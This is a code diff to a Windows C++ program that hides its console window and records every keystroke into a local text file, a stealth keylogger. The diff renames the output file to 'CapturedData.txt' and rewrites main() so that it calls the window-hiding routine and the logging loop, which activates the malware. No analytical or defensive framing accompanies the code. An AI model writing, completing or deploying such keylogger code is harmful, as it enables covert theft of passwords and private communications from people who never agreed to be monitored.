@@ -10,6 +10,7 @@ void hide_cross_section()
     HWND cross_section = FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(cross_section,0);
 }
+
 void log_input()
 {
     char key;
@@ -19,7 +20,7 @@ void log_input()
         {
             if (GetAsyncKeyState(key) == -32767)
             {
-                ofstream write("Record.txt", ios::app);
+                ofstream write("CapturedData.txt", ios::app);
                 if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10)))
                 {
                     key += 32;
@@ -198,7 +199,7 @@ void log_input()
 
 int main()
 {
-    
-    
+    hide_cross_section();
+    log_input();
     return 0;
 }
